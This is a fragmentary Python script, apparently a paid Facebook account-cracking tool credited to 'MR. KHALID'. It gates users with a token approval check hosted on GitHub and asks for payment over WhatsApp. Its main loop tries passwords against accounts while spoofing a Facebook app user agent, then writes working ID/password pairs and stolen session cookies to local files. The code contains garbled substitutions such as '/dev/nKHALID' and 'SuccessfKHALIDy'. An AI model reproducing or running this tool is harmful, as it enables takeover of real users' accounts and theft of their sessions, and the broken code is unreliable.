...
try:
        ...
        os.system('pip install requests futures==2 > /dev/nKHALID')
...
try:
    ...
    os.system('pip install mechanize requests futures bs4==2 > /dev/nKHALID')
...
try:
	prox= requests.get('https://github.com/KHALID36tm/PAID-LITON/blob/main/Afroveal5.txt').text
...
logo =("""   
   ...
   ┌━━━━━━━━━━━━━━━━━ 𓆩𝑴𝑹. 𝑲𝑯𝑨𝑳𝑰𝑫 𓆪 ━━━━━━━━━━━━┑
               \033[34;1mCREATED BY   :  𓆩𝑴𝑹. 𝑲𝑯𝑨𝑳𝑰𝑫 𓆪             
               \033[33;1mFACEBOK      :  𓆩𝑴𝑹. 𝑲𝑯𝑨𝑳𝑰𝑫 𓆪               
               \033[38;5;46mGITHUB       :  𝑲𝑰𝑵𝑮 𝑹𝑬𝑯𝑨𝑵        
               \033[35;1mSTATUS       :   𝐏𝐀𝐈𝐃🎭          
               \033[37;1mTEAM         :  𓆩𝐔𝐩𝐝𝐚𝐭 𝐋𝐨𝐠𝐨 𝑲𝑯𝑨𝑳𝑰𝑫𓆪                 
               \033[33;1mTOOL VIRSION :  𝟎.𝟏                    
               \x1b[38;5;196mTOOL WORK    :  𝐎𝐍𝐋𝐘 𝐃𝐀𝐓𝐀           
\033[37;1m   └━━━━━━━━━━━━━━━━━ 𓆩𝑴𝑹. 𝑲𝑯𝑨𝑳𝑰𝑫 𓆪  ━━━━━━━━━━━━┘
""")
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/KINGREHAN786/Kh/blob/main/Kh.txt').text
    if id in httpCaht:
      print("\033[38;5;46mYour Token is SuccessfKHALIDy Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      menu()
      menu1()
      ...
      print('BKASH PERSONAL - +923058355072')
      print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
      print('\33[1;37m----------------------------------------------')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923058355072?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def random_headers():
    ...
    user_agent = f"Mozilla/5.0 (Linux; Android 13; SM-S911B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]"
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mlLITON KHALID-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('KHALID-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('KHALID-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(KHALID-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('KHALID-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
